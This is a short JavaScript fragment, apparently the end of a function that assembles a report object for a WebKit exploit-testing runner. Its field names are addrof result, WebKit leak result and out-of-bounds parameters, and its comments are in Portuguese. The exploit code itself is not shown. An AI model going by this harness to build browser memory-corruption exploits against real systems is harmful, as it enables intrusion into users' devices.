        stringifyResult: best_result_for_runner.stringifyResult, // Pode ser muito grande
        addrof_result: best_result_for_runner.addrof_result,
        webkit_leak_result: best_result_for_runner.webkit_leak_result,
        iteration_results_summary: iteration_results_summary, // Pode ser MUITO grande
        total_probe_calls_last_iter: final_probe_call_count_for_report,
        oob_params_of_best_result: best_result_for_runner.oob_params_of_best_result,
        heisenbug_on_M2_in_best_result: best_result_for_runner.heisenbug_on_M2_confirmed_by_tc_probe
    };
}
